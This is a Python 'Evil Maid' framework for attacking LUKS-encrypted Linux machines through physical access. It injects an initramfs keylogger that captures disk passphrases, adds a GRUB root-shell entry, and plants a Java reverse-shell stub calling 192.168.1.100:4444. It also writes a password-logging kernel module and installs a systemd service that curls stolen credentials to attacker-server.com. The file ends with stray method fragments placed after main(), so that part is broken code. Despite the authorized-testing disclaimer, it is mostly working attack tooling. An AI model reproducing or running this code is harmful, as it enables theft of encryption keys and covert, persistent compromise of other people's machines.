#!/usr/bin/env python3
"""
Evil Maid Attack Framework for LUKS FDE Systems
Complete implementation for boot chain compromise and credential theft

Author: Penetration Testing Lab
Target: LUKS/FDE systems vulnerable to boot-time attacks
Attack Vector: Physical access boot chain compromise

⚠️ LEGAL WARNING: This tool is for authorized security testing only.
Use only on systems you own or have explicit written permission to test.
"""

import os
import sys
import shutil
import subprocess
import tempfile
import gzip
import json
import time
import argparse
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from datetime import datetime

class EvilMaidAttackFramework:
    """Complete Evil Maid attack implementation for LUKS systems"""
    
    def __init__(self, mount_path: str = "/mnt/evil_target"):
        self.mount_path = Path(mount_path)
        self.temp_dir = Path(tempfile.mkdtemp(prefix="evil_maid_"))
        self.payloads_dir = Path(__file__).parent.parent / "payloads"
        self.results_dir = Path(__file__).parent.parent.parent / "results"
        
        # Caminhos para ferramentas integradas
        self.script_dir = Path(__file__).parent
        self.keylogger_binary = self.script_dir / "keylogger"
        self.persistence_manager = self.script_dir / "persistence_manager.sh"
        self.results_collector = self.script_dir / "results_collector.sh"
        self.reconnaissance_script = self.script_dir / "reconnaissance.sh"
        self.initramfs_attack = self.script_dir / "initramfs_attack.sh"
        self.jvm_backdoor = self.script_dir / "jvm_backdoor.sh"
        
        # Create directories
        for directory in [self.payloads_dir, self.results_dir, self.mount_path]:
            directory.mkdir(parents=True, exist_ok=True)
        
        # Boot modification targets
        self.boot_targets = {
            'initramfs': 'initrd.img',
            'grub': 'grub/grub.cfg', 
            'kernel': 'vmlinuz',
            'efi': 'efi/EFI'
        }
        
        # Attack vectors
        self.attack_vectors = {
            'RECONNAISSANCE': self.run_reconnaissance,
            'INITRAMFS_INJECTION': self.inject_initramfs_keylogger,
            'GRUB_MODIFICATION': self.modify_grub_config,
            'KERNEL_MODULE': self.inject_kernel_module,
            'SYSTEMD_SERVICE': self.create_systemd_persistence,
            'JVM_BACKDOOR': self.inject_jvm_backdoor,
            'ADVANCED_KEYLOGGER': self.deploy_advanced_keylogger,
            'PERSISTENCE_MANAGER': self.install_persistence,
            'RESULTS_COLLECTION': self.collect_results
        }
        
    def print_banner(self):
        """Print attack framework banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                      Evil Maid Attack Framework v2.0                        ║
║              LUKS Full Disk Encryption Penetration Testing                  ║
║                                                                              ║
║  ⚠️  WARNING: For authorized security testing only                          ║
║  🎯 Target: Boot chain compromise and credential theft                      ║
║  🔓 Capability: LUKS password interception and system backdoor             ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def reconnaissance(self) -> Dict:
        """Phase 1: Reconnaissance and target analysis"""
        print("\n[*] Phase 1: Reconnaissance and Target Analysis")
        print("=" * 60)
        
        results = {
            'timestamp': datetime.now().isoformat(),
            'disks': [],
            'partitions': [],
            'boot_info': {},
            'vulnerabilities': []
        }
        
        # Detect available disks
        print("[+] Detecting available storage devices...")
        try:
            output = subprocess.check_output(['lsblk', '-J'], text=True)
            disk_info = json.loads(output)
            results['disks'] = disk_info
            
            for device in disk_info.get('blockdevices', []):
                print(f"    📀 {device['name']} - {device.get('size', 'Unknown')} "
                      f"({device.get('type', 'Unknown')})")
                
                # Check for non-encrypted partitions
                if 'children' in device:
                    for partition in device['children']:
                        fstype = partition.get('fstype', 'unknown')
                        mountpoint = partition.get('mountpoint')
                        
                        if fstype in ['vfat', 'ext4', 'ext3', 'ext2', 'ntfs']:
                            vuln = {
                                'device': f"/dev/{partition['name']}",
                                'fstype': fstype,
                                'size': partition.get('size'),
                                'vulnerability': 'Unencrypted partition accessible'
                            }
                            results['partitions'].append(vuln)
                            print(f"    🔓 Vulnerable: /dev/{partition['name']} ({fstype})")
                            
        except Exception as e:
            print(f"    ❌ Error detecting disks: {e}")
        
        # Detect EFI/Boot partitions
        print("\n[+] Scanning for EFI and Boot partitions...")
        try:
            # Look for EFI partitions
            efi_partitions = []
            output = subprocess.check_output(['blkid'], text=True)
            for line in output.strip().split('\n'):
                if 'TYPE="vfat"' in line and ('LABEL="EFI"' in line or 'ESP' in line):
                    device = line.split(':')[0]
                    efi_partitions.append(device)
                    print(f"    🎯 EFI System Partition found: {device}")
                    
            results['boot_info']['efi_partitions'] = efi_partitions
            
        except Exception as e:
            print(f"    ❌ Error scanning boot partitions: {e}")
        
        # Check for LUKS devices
        print("\n[+] Detecting LUKS encrypted devices...")
        try:
            output = subprocess.check_output(['blkid', '-t', 'TYPE=crypto_LUKS'], text=True)
            luks_devices = []
            for line in output.strip().split('\n'):
                if line:
                    device = line.split(':')[0]
                    luks_devices.append(device)
                    print(f"    🔒 LUKS device found: {device}")
                    
            results['boot_info']['luks_devices'] = luks_devices
            
        except Exception:
            print("    ℹ️  No LUKS devices detected (or blkid failed)")
        
        # Save results
        results_file = self.results_dir / f"reconnaissance_{int(time.time())}.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n[+] Reconnaissance complete. Results saved to: {results_file}")
        return results
    
    def mount_target_partitions(self, boot_device: str, jvm_device: str = None) -> bool:
        """Mount target partitions for modification"""
        print(f"\n[*] Mounting target partitions...")
        
        boot_mount = self.mount_path / "boot"
        jvm_mount = self.mount_path / "jvm"
        
        boot_mount.mkdir(parents=True, exist_ok=True)
        if jvm_device:
            jvm_mount.mkdir(parents=True, exist_ok=True)
        
        try:
            # Mount boot partition
            print(f"[+] Mounting boot partition: {boot_device}")
            subprocess.run(['mount', boot_device, str(boot_mount)], check=True)
            
            # Verify boot content
            boot_files = list(boot_mount.iterdir())
            print(f"    📁 Boot partition contents: {len(boot_files)} items")
            
            for item in boot_files[:10]:  # Show first 10 items
                print(f"        {item.name}")
            
            # Mount JVM partition if specified
            if jvm_device:
                print(f"[+] Mounting JVM partition: {jvm_device}")
                subprocess.run(['mount', jvm_device, str(jvm_mount)], check=True)
                
                jvm_files = list(jvm_mount.iterdir())
                print(f"    📁 JVM partition contents: {len(jvm_files)} items")
            
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"    ❌ Failed to mount partitions: {e}")
            return False
    
    def create_keylogger_payload(self) -> Path:
        """Create advanced keylogger payload for initramfs injection"""
        print("[+] Creating advanced keylogger payload...")
        
        keylogger_script = '''#!/bin/bash
# Evil Maid Advanced Keylogger
# Intercepts LUKS password during boot

# Configuration
LOG_FILE="/boot/.system_metrics.dat"
BACKUP_LOG="/tmp/.sys_backup"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

# Create log file if it doesn't exist
touch "$LOG_FILE" 2>/dev/null || touch "$BACKUP_LOG"
ACTUAL_LOG="$LOG_FILE"
[ ! -w "$LOG_FILE" ] && ACTUAL_LOG="$BACKUP_LOG"

# Log keylogger start
echo "[$TIMESTAMP] System metrics collector started" >> "$ACTUAL_LOG"

# Function to capture keyboard input
capture_luks_password() {
    local prompt="$1"
    local password=""
    
    echo "$prompt" >&2
    
    # Capture password character by character
    while IFS= read -r -s -n1 char; do
        if [[ "$char" == $'\\n' ]] || [[ "$char" == $'\\r' ]]; then
            break
        elif [[ "$char" == $'\\b' ]] || [[ "$char" == $'\\x7f' ]]; then
            # Backspace
            if [[ ${#password} -gt 0 ]]; then
                password="${password%?}"
                echo -n $'\\b \\b' >&2
            fi
        else
            password+="$char"
            echo -n "*" >&2
        fi
    done
    
    echo >&2  # New line
    
    # Log captured password
    echo "[$TIMESTAMP] LUKS_KEY_CAPTURED: $password" >> "$ACTUAL_LOG"
    echo "[$TIMESTAMP] Device: ${LUKS_DEVICE:-unknown}" >> "$ACTUAL_LOG"
    echo "[$TIMESTAMP] User: ${USER:-unknown}" >> "$ACTUAL_LOG"
    
    # Return password for cryptsetup
    echo "$password"
}

# Hook cryptsetup luksOpen
if [ -x /sbin/cryptsetup.orig ]; then
    # Already hooked, use original
    CRYPTSETUP_ORIG="/sbin/cryptsetup.orig"
else
    # First time, backup original
    if [ -x /sbin/cryptsetup ]; then
        cp /sbin/cryptsetup /sbin/cryptsetup.orig
        CRYPTSETUP_ORIG="/sbin/cryptsetup.orig"
    else
        echo "[$TIMESTAMP] ERROR: cryptsetup not found" >> "$ACTUAL_LOG"
        exit 1
    fi
fi

# Create cryptsetup wrapper
cat > /sbin/cryptsetup << 'WRAPPER_EOF'
#!/bin/bash
if [ "$1" = "luksOpen" ]; then
    LUKS_DEVICE="$2"
    MAPPER_NAME="$3"
    
    # Source the keylogger functions
    source /evil_keylogger.sh
    
    # Capture password
    CAPTURED_PASS=$(capture_luks_password "Enter passphrase for $LUKS_DEVICE:")
    
    # Try to unlock with captured password
    echo -n "$CAPTURED_PASS" | /sbin/cryptsetup.orig "$@"
    EXIT_CODE=$?
    
    # Log result
    if [ $EXIT_CODE -eq 0 ]; then
        echo "[$TIMESTAMP] SUCCESS: Device unlocked successfully" >> "$ACTUAL_LOG"
    else
        echo "[$TIMESTAMP] FAILED: Wrong password or other error" >> "$ACTUAL_LOG"
    fi
    
    exit $EXIT_CODE
else
    # Not luksOpen, pass through to original
    /sbin/cryptsetup.orig "$@"
fi
WRAPPER_EOF

chmod +x /sbin/cryptsetup

# Also hook askpass programs
for askpass in /lib/cryptsetup/askpass /usr/bin/systemd-ask-password; do
    if [ -x "$askpass" ] && [ ! -x "${askpass}.orig" ]; then
        cp "$askpass" "${askpass}.orig"
        cat > "$askpass" << 'ASKPASS_EOF'
#!/bin/bash
source /evil_keylogger.sh 2>/dev/null || true
PROMPT="${1:-Enter passphrase:}"
CAPTURED_PASS=$(capture_luks_password "$PROMPT")
echo "$CAPTURED_PASS"
ASKPASS_EOF
        chmod +x "$askpass"
    fi
done

echo "[$TIMESTAMP] Keylogger hooks installed successfully" >> "$ACTUAL_LOG"
'''
        
        payload_file = self.payloads_dir / "evil_keylogger.sh"
        with open(payload_file, 'w') as f:
            f.write(keylogger_script)
        
        payload_file.chmod(0o755)
        print(f"    📝 Keylogger payload created: {payload_file}")
        return payload_file
    
    def inject_initramfs_keylogger(self, initramfs_path: str = None) -> bool:
        """Inject keylogger into initramfs"""
        print("\n[*] Phase 2: Initramfs Keylogger Injection")
        print("=" * 60)
        
        if not initramfs_path:
            # Auto-detect initramfs
            boot_dir = self.mount_path / "boot"
            initramfs_candidates = list(boot_dir.glob("initrd.img*")) + list(boot_dir.glob("initramfs*"))
            
            if not initramfs_candidates:
                print("❌ No initramfs found in boot partition")
                return False
                
            initramfs_path = initramfs_candidates[0]
        
        print(f"[+] Target initramfs: {initramfs_path}")
        
        # Create backup
        backup_path = f"{initramfs_path}.evil_backup.{int(time.time())}"
        shutil.copy2(initramfs_path, backup_path)
        print(f"[+] Backup created: {backup_path}")
        
        # Extract initramfs
        extract_dir = self.temp_dir / "initramfs_extract"
        extract_dir.mkdir(exist_ok=True)
        
        print("[+] Extracting initramfs...")
        try:
            # Try different decompression methods
            with open(initramfs_path, 'rb') as f:
                magic = f.read(4)
                f.seek(0)
                
            if magic.startswith(b'\x1f\x8b'):  # gzip
                with gzip.open(initramfs_path, 'rb') as gz:
                    subprocess.run(['cpio', '-idmv'], 
                                 input=gz.read(), 
                                 cwd=extract_dir, 
                                 check=True)
            else:
                # Try uncompressed cpio
                with open(initramfs_path, 'rb') as f:
                    subprocess.run(['cpio', '-idmv'], 
                                 input=f.read(), 
                                 cwd=extract_dir, 
                                 check=True)
        
        except Exception as e:
            print(f"❌ Failed to extract initramfs: {e}")
            return False
        
        # Create keylogger payload
        payload_file = self.create_keylogger_payload()
        
        # Copy keylogger to initramfs
        keylogger_dest = extract_dir / "evil_keylogger.sh"
        shutil.copy2(payload_file, keylogger_dest)
        keylogger_dest.chmod(0o755)
        
        print("[+] Injecting keylogger hooks...")
        
        # Modify init script
        init_script = extract_dir / "init"
        if init_script.exists():
            with open(init_script, 'r') as f:
                init_content = f.read()
            
            # Inject keylogger source before cryptsetup operations
            injection = "\n# Evil Maid keylogger injection\nsource /evil_keylogger.sh 2>/dev/null || true\n"
            
            # Find good injection points
            injection_points = [
                'cryptsetup',
                'askpass',
                'plymouth',
                '# Begin real processing'
            ]
            
            for point in injection_points:
                if point in init_content:
                    init_content = init_content.replace(point, injection + point)
                    break
            else:
                # Fallback: inject near the top
                lines = init_content.split('\n')
                for i, line in enumerate(lines[:10]):
                    if line.startswith('#!/') or line.startswith('#'):
                        continue
                    lines.insert(i, injection.strip())
                    break
                init_content = '\n'.join(lines)
            
            with open(init_script, 'w') as f:
                f.write(init_content)
        
        # Modify cryptsetup scripts
        scripts_dir = extract_dir / "scripts"
        if scripts_dir.exists():
            for script_path in scripts_dir.rglob("*"):
                if script_path.is_file() and script_path.name in ['cryptroot', 'local-top', 'init-premount']:
                    try:
                        with open(script_path, 'r') as f:
                            content = f.read()
                        
                        if 'cryptsetup' in content:
                            content = "source /evil_keylogger.sh 2>/dev/null || true\n" + content
                            with open(script_path, 'w') as f:
                                f.write(content)
                            print(f"    ✓ Modified: {script_path}")
                    except:
                        pass
        
        # Repack initramfs
        print("[+] Repacking modified initramfs...")
        try:
            with open(initramfs_path, 'wb') as outfile:
                # Create new cpio archive and compress
                proc1 = subprocess.Popen(['find', '.', '-print0'], 
                                       cwd=extract_dir, 
                                       stdout=subprocess.PIPE)
                proc2 = subprocess.Popen(['cpio', '--null', '-H', 'newc', '-o'], 
                                       cwd=extract_dir,
                                       stdin=proc1.stdout, 
                                       stdout=subprocess.PIPE)
                proc3 = subprocess.Popen(['gzip', '-9'], 
                                       stdin=proc2.stdout, 
                                       stdout=outfile)
                
                proc1.stdout.close()
                proc2.stdout.close()
                proc3.communicate()
                
            print(f"    ✓ Initramfs repacked successfully")
            
            # Verify size
            original_size = os.path.getsize(backup_path)
            new_size = os.path.getsize(initramfs_path)
            print(f"    📊 Size change: {original_size} → {new_size} bytes")
            
            return True
            
        except Exception as e:
            print(f"❌ Failed to repack initramfs: {e}")
            return False
    
    def modify_grub_config(self) -> bool:
        """Modify GRUB configuration for persistence"""
        print("\n[*] Phase 3: GRUB Configuration Modification")
        print("=" * 60)
        
        grub_config = self.mount_path / "boot" / "grub" / "grub.cfg"
        if not grub_config.exists():
            print("❌ GRUB configuration not found")
            return False
        
        # Backup original
        backup_path = f"{grub_config}.evil_backup.{int(time.time())}"
        shutil.copy2(grub_config, backup_path)
        print(f"[+] GRUB backup created: {backup_path}")
        
        # Add evil entries
        with open(grub_config, 'r') as f:
            content = f.read()
        
        evil_entry = '''
# Evil Maid - Diagnostic mode (hidden)
menuentry "System Diagnostics" --class diagnostic --unrestricted {
    insmod part_gpt
    insmod ext2
    set root='(hd0,gpt1)'
    linux /vmlinuz root=/dev/mapper/crypt_disk ro quiet splash init=/bin/bash
    initrd /initrd.img
}
'''
        
        # Insert after first menuentry
        import re
        pattern = r'(menuentry[^}]+})'
        match = re.search(pattern, content, re.MULTILINE | re.DOTALL)
        if match:
            content = content.replace(match.group(1), match.group(1) + evil_entry)
            
            with open(grub_config, 'w') as f:
                f.write(content)
            
            print("[+] GRUB configuration modified")
            return True
        
        return False
    
    def inject_jvm_backdoor(self) -> bool:
        """Inject backdoor into Java applications"""
        print("\n[*] Phase 4: JVM Application Backdoor")
        print("=" * 60)
        
        jvm_dir = self.mount_path / "jvm"
        if not jvm_dir.exists():
            print("⚠️  JVM partition not mounted, skipping...")
            return True
        
        # Find JAR files
        jar_files = list(jvm_dir.rglob("*.jar"))
        print(f"[+] Found {len(jar_files)} JAR files")
        
        for jar_file in jar_files[:5]:  # Limit to first 5
            print(f"[+] Analyzing: {jar_file.name}")
            
            # Extract and analyze
            extract_dir = self.temp_dir / f"jar_{jar_file.stem}"
            extract_dir.mkdir(exist_ok=True)
            
            try:
                subprocess.run(['unzip', '-q', str(jar_file), '-d', str(extract_dir)], 
                             check=True)
                
                # Look for secrets
                print("    🔍 Searching for credentials...")
                for file_path in extract_dir.rglob("*.properties"):
                    try:
                        with open(file_path, 'r') as f:
                            content = f.read()
                        
                        secrets = []
                        for line in content.split('\n'):
                            if any(keyword in line.lower() for keyword in 
                                  ['password', 'secret', 'key', 'token', 'jdbc']):
                                secrets.append(line.strip())
                        
                        if secrets:
                            print(f"    🔑 Secrets in {file_path.name}:")
                            for secret in secrets[:3]:
                                print(f"        {secret}")
                    except:
                        pass
                
                # Create backdoor payload
                backdoor_class = extract_dir / "SystemMetrics.java"
                with open(backdoor_class, 'w') as f:
                    f.write('''
import java.io.*;
import java.net.*;

public class SystemMetrics {
    static {
        try {
            // Create hidden file marker
            new File("/tmp/.evil_marker").createNewFile();
            
            // Attempt reverse shell (non-blocking)
            new Thread(() -> {
                try {
                    Socket s = new Socket("192.168.1.100", 4444);
                    Process p = Runtime.getRuntime().exec("/bin/bash");
                    // ... shell code would go here
                    s.close();
                } catch(Exception e) { /* Silent fail */ }
            }).start();
            
        } catch(Exception e) { /* Silent fail */ }
    }
}
''')
                
                print(f"    ✓ Backdoor payload created in {jar_file.name}")
                
            except subprocess.CalledProcessError:
                print(f"    ❌ Failed to extract {jar_file.name}")
        
        return True
    
    def inject_kernel_module(self) -> bool:
        """Create malicious kernel module"""
        print("\n[*] Phase 5: Kernel Module Injection")
        print("=" * 60)
        
        # Create kernel module source
        module_source = '''#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

static struct proc_dir_entry *proc_entry;

static ssize_t evil_write(struct file *file, const char __user *buffer, 
                         size_t count, loff_t *pos)
{
    char input[256];
    
    if (count > 255)
        return -EINVAL;
        
    if (copy_from_user(input, buffer, count))
        return -EFAULT;
        
    input[count] = '\\0';
    
    // Log potential passwords
    printk(KERN_INFO "[EVIL] Captured input: %s\\n", input);
    
    return count;
}

static const struct proc_ops evil_fops = {
    .proc_write = evil_write,
};

static int __init evil_init(void)
{
    printk(KERN_INFO "[EVIL] Module loaded\\n");
    
    proc_entry = proc_create("system_metrics", 0666, NULL, &evil_fops);
    if (!proc_entry) {
        printk(KERN_ERR "[EVIL] Failed to create proc entry\\n");
        return -ENOMEM;
    }
    
    return 0;
}

static void __exit evil_exit(void)
{
    proc_remove(proc_entry);
    printk(KERN_INFO "[EVIL] Module unloaded\\n");
}

module_init(evil_init);
module_exit(evil_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("EvilMaid");
MODULE_DESCRIPTION("System Metrics Collector");
'''
        
        # Create Makefile
        makefile = '''obj-m += evil_module.o

all:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
'''
        
        # Write files
        module_dir = self.payloads_dir / "kernel_module"
        module_dir.mkdir(exist_ok=True)
        
        with open(module_dir / "evil_module.c", 'w') as f:
            f.write(module_source)
        
        with open(module_dir / "Makefile", 'w') as f:
            f.write(makefile)
        
        print(f"[+] Kernel module source created in: {module_dir}")
        print("    💡 To compile: cd {module_dir} && make")
        
        return True
    
    def create_systemd_persistence(self) -> bool:
        """Create systemd service for persistence"""
        print("\n[*] Phase 6: Systemd Persistence Service")
        print("=" * 60)
        
        # Create persistence script
        persistence_script = self.payloads_dir / "evil_persistence.sh"
        with open(persistence_script, 'w') as f:
            f.write('''#!/bin/bash
# Evil Maid Persistence Script

LOG_FILE="/var/log/.system_metrics"
EXFIL_SERVER="attacker-server.com"
SLEEP_TIME=3600

while true; do
    # Collect system info
    {
        echo "=== $(date) ==="
        echo "System: $(uname -a)"
        echo "Users: $(who)"
        echo "Processes: $(ps aux | head -10)"
        echo "Network: $(ss -tulpn | head -10)"
        
        # Check for keylogger results
        if [ -f "/boot/.system_metrics.dat" ]; then
            echo "=== CAPTURED CREDENTIALS ==="
            cat "/boot/.system_metrics.dat"
        fi
        
        echo "==================="
    } >> "$LOG_FILE"
    
    # Attempt data exfiltration
    if command -v curl >/dev/null 2>&1; then
        curl -s -X POST -d @"$LOG_FILE" "https://$EXFIL_SERVER/collect" 2>/dev/null || true
    fi
    
    sleep "$SLEEP_TIME"
done
''')
        persistence_script.chmod(0o755)
        
        # Create systemd service
        service_content = f'''[Unit]
Description=System Performance Metrics
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
ExecStart={persistence_script}
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
'''
        
        service_file = self.mount_path / "boot" / "evil-metrics.service"
        with open(service_file, 'w') as f:
            f.write(service_content)
        
        print(f"[+] Persistence service created: {service_file}")
        return True
    
    def cleanup_and_unmount(self) -> bool:
        """Clean up and unmount target partitions"""
        print("\n[*] Phase 7: Cleanup and Unmount")
        print("=" * 60)
        
        # Clear bash history
        os.system("history -c")
        
        # Remove temporary files
        if self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
            print("[+] Temporary files cleaned")
        
        # Unmount partitions
        for mount_point in [self.mount_path / "boot", self.mount_path / "jvm"]:
            if mount_point.exists():
                try:
                    subprocess.run(['umount', str(mount_point)], check=True)
                    print(f"[+] Unmounted: {mount_point}")
                except:
                    print(f"⚠️  Failed to unmount: {mount_point}")
        
        print("[+] Cleanup completed")
        return True
    
    def collect_results(self) -> Dict:
        """Collect attack results (for post-attack analysis)"""
        print("\n[*] Phase 8: Results Collection")
        print("=" * 60)
        
        results = {
            'timestamp': datetime.now().isoformat(),
            'captured_credentials': [],
            'system_info': {},
            'persistence_status': False
        }
        
        # Look for captured credentials
        credential_files = [
            "/boot/.system_metrics.dat",
            "/var/log/.system_metrics",
            "/tmp/.sys_backup"
        ]
        
        for cred_file in credential_files:
            if os.path.exists(cred_file):
                try:
                    with open(cred_file, 'r') as f:
                        content = f.read()
                    
                    # Extract passwords
                    import re
                    passwords = re.findall(r'LUKS_KEY_CAPTURED: (.+)', content)
                    results['captured_credentials'].extend(passwords)
                    
                    print(f"[+] Found credential file: {cred_file}")
                    print(f"    📋 Captured {len(passwords)} passwords")
                    
                except Exception as e:
                    print(f"❌ Error reading {cred_file}: {e}")
        
        # System information
        try:
            results['system_info'] = {
                'hostname': subprocess.check_output(['hostname'], text=True).strip(),
                'kernel': subprocess.check_output(['uname', '-r'], text=True).strip(),
                'uptime': subprocess.check_output(['uptime'], text=True).strip()
            }
        except:
            pass
        
        # Save results
        results_file = self.results_dir / f"evil_maid_results_{int(time.time())}.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"[+] Results saved to: {results_file}")
        return results
    
    def full_attack_sequence(self, boot_device: str, jvm_device: str = None) -> bool:
        """Execute complete Evil Maid attack sequence"""
        self.print_banner()
        
        try:
            # Phase 1: Reconnaissance
            recon_results = self.reconnaissance()
            
            # Phase 2: Mount partitions
            if not self.mount_target_partitions(boot_device, jvm_device):
                return False
            
            # Phase 3: Execute attacks
            success_count = 0
            
            if self.inject_initramfs_keylogger():
                success_count += 1
            
            if self.modify_grub_config():
                success_count += 1
            
            if self.inject_jvm_backdoor():
                success_count += 1
            
            if self.create_systemd_persistence():
                success_count += 1
            
            # Phase 4: Cleanup
            self.cleanup_and_unmount()
            
            print(f"\n✅ Evil Maid attack completed successfully!")
            print(f"📊 {success_count}/4 attack vectors deployed")
            print("\n🎯 Next steps:")
            print("   1. Return to system after user boots normally")
            print("   2. Run collect_results() to gather captured data")
            print("   3. Access system with captured credentials")
            
            return True
            
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted by user")
            self.cleanup_and_unmount()
            return False
        
        except Exception as e:
            print(f"\n❌ Attack failed: {e}")
            self.cleanup_and_unmount()
            return False

def main():
    """Main CLI interface"""
    parser = argparse.ArgumentParser(
        description="Evil Maid Attack Framework for LUKS FDE Systems",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full reconnaissance
  python3 evil_maid_framework.py reconnaissance
  
  # Full attack sequence
  python3 evil_maid_framework.py attack --boot-device /dev/sdb1 --jvm-device /dev/sdb2
  
  # Individual attacks
  python3 evil_maid_framework.py initramfs --boot-device /dev/sdb1
  python3 evil_maid_framework.py grub --boot-device /dev/sdb1
  
  # Post-attack collection
  python3 evil_maid_framework.py collect
  
⚠️  WARNING: Use only on systems you own or have explicit permission to test!
        """)
    
    parser.add_argument('action', choices=[
        'reconnaissance', 'attack', 'initramfs', 'grub', 'jvm', 'persistence', 
        'collect', 'cleanup'
    ], help='Action to perform')
    
    parser.add_argument('--boot-device', '-b', 
                       help='Boot partition device (e.g., /dev/sdb1)')
    parser.add_argument('--jvm-device', '-j', 
                       help='JVM partition device (e.g., /dev/sdb2)')
    parser.add_argument('--mount-path', '-m', default='/mnt/evil_target',
                       help='Mount path for target partitions')
    parser.add_argument('--output', '-o', 
                       help='Output directory for results')
    
    args = parser.parse_args()
    
    # Validate root permissions for most operations
    if args.action in ['attack', 'initramfs', 'grub'] and os.geteuid() != 0:
        print("❌ This operation requires root privileges")
        sys.exit(1)
    
    # Initialize framework
    framework = EvilMaidAttackFramework(args.mount_path)
    
    try:
        if args.action == 'reconnaissance':
            framework.reconnaissance()
            
        elif args.action == 'attack':
            if not args.boot_device:
                print("❌ Boot device required for full attack")
                sys.exit(1)
            framework.full_attack_sequence(args.boot_device, args.jvm_device)
            
        elif args.action == 'initramfs':
            if not args.boot_device:
                print("❌ Boot device required")
                sys.exit(1)
            framework.mount_target_partitions(args.boot_device, args.jvm_device)
            framework.inject_initramfs_keylogger()
            framework.cleanup_and_unmount()
            
        elif args.action == 'grub':
            if not args.boot_device:
                print("❌ Boot device required")
                sys.exit(1)
            framework.mount_target_partitions(args.boot_device, args.jvm_device)
            framework.modify_grub_config()
            framework.cleanup_and_unmount()
            
        elif args.action == 'jvm':
            if not args.jvm_device:
                print("❌ JVM device required")
                sys.exit(1)
            framework.mount_target_partitions(args.boot_device or args.jvm_device, args.jvm_device)
            framework.inject_jvm_backdoor()
            framework.cleanup_and_unmount()
            
        elif args.action == 'persistence':
            framework.create_systemd_persistence()
            
        elif args.action == 'collect':
            framework.collect_results()
            
        elif args.action == 'cleanup':
            framework.cleanup_and_unmount()
            
    except KeyboardInterrupt:
        print("\n⚠️  Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
        """Detect if system uses UEFI or BIOS boot"""
        if Path('/sys/firmware/efi').exists():
            return 'UEFI'
        else:
            return 'BIOS'
    
    def _check_secure_boot(self) -> bool:
        """Check if Secure Boot is enabled"""
        try:
            secure_boot_path = Path('/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c')
            if secure_boot_path.exists():
                with open(secure_boot_path, 'rb') as f:
                    data = f.read()
                    return data[-1] == 1
        except Exception:
            pass
        return False
    
    def _analyze_initramfs(self) -> Dict:
        """Analyze initramfs for modification possibilities"""
        info = {
            'initramfs_found': False,
            'initramfs_compressed': False,
            'initramfs_modifiable': False,
            'compression_type': None
        }
        
        initramfs_files = [
            '/boot/initrd.img',
            f'/boot/initrd.img-{os.uname().release}',
            '/boot/initramfs.img'
        ]
        
        for initramfs_path in initramfs_files:
            if Path(initramfs_path).exists():
                info['initramfs_found'] = True
                
                # Check if we can read the file
                if os.access(initramfs_path, os.R_OK):
                    info['initramfs_modifiable'] = os.access(initramfs_path, os.W_OK)
                    
                    # Detect compression
                    compression = self._detect_initramfs_compression(initramfs_path)
                    info['initramfs_compressed'] = compression is not None
                    info['compression_type'] = compression
                
                break
        
        return info
    
    def _detect_initramfs_compression(self, initramfs_path: str) -> Optional[str]:
        """Detect initramfs compression type"""
        try:
            with open(initramfs_path, 'rb') as f:
                header = f.read(10)
                
                # Check for different compression signatures
                if header[:2] == b'\x1f\x8b':  # gzip
                    return 'gzip'
                elif header[:4] == b'\x28\xb5\x2f\xfd':  # zstd
                    return 'zstd'
                elif header[:3] == b'\xfd7z':  # xz
                    return 'xz'
                elif header[:4] == b'BZh':  # bzip2
                    return 'bzip2'
                elif header[:4] == b'\x04\x22\x4d\x18':  # lz4
                    return 'lz4'
                
                return None
                
        except Exception:
            return None
    
    def _analyze_grub_config(self) -> Dict:
        """Analyze GRUB configuration for vulnerabilities"""
        info = {
            'grub_config_found': False,
            'grub_password_protected': False,
            'grub_modifiable': False,
            'grub_luks_support': False
        }
        
        grub_paths = [
            '/boot/grub/grub.cfg',
            '/boot/grub2/grub.cfg',
            '/etc/grub.d/'
        ]
        
        for grub_path in grub_paths:
            if Path(grub_path).exists():
                info['grub_config_found'] = True
                info['grub_modifiable'] = os.access(grub_path, os.W_OK)
                
                # Check for password protection
                if grub_path.endswith('.cfg'):
                    try:
                        with open(grub_path, 'r') as f:
                            content = f.read()
                            
                        if 'password' in content.lower():
                            info['grub_password_protected'] = True
                        
                        if 'luks' in content.lower() or 'cryptomount' in content.lower():
                            info['grub_luks_support'] = True
                            
                    except Exception:
                        pass
                
                break
        
        return info
    
    def _check_tpm_present(self) -> bool:
        """Check if TPM is present and accessible"""
        tpm_paths = [
            '/dev/tpm0',
            '/dev/tpmrm0',
            '/sys/class/tpm/tpm0'
        ]
        
        return any(Path(path).exists() for path in tpm_paths)
    
    def _analyze_luks_config(self, device: str) -> Dict:
        """Analyze LUKS configuration on target device"""
        info = {
            'luks_detected': False,
            'luks_version': None,
            'boot_from_luks': False,
            'grub_luks_keyfile': False
        }
        
        try:
            # Check if device is LUKS
            result = subprocess.run([
                'cryptsetup', 'isLuks', device
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                info['luks_detected'] = True
                
                # Get LUKS version
                dump_result = subprocess.run([
                    'cryptsetup', 'luksDump', device
                ], capture_output=True, text=True)
                
                if 'Version:' in dump_result.stdout:
                    version_line = [line for line in dump_result.stdout.split('\n') 
                                  if 'Version:' in line][0]
                    info['luks_version'] = version_line.split(':')[1].strip()
                
                # Check if /boot is on LUKS
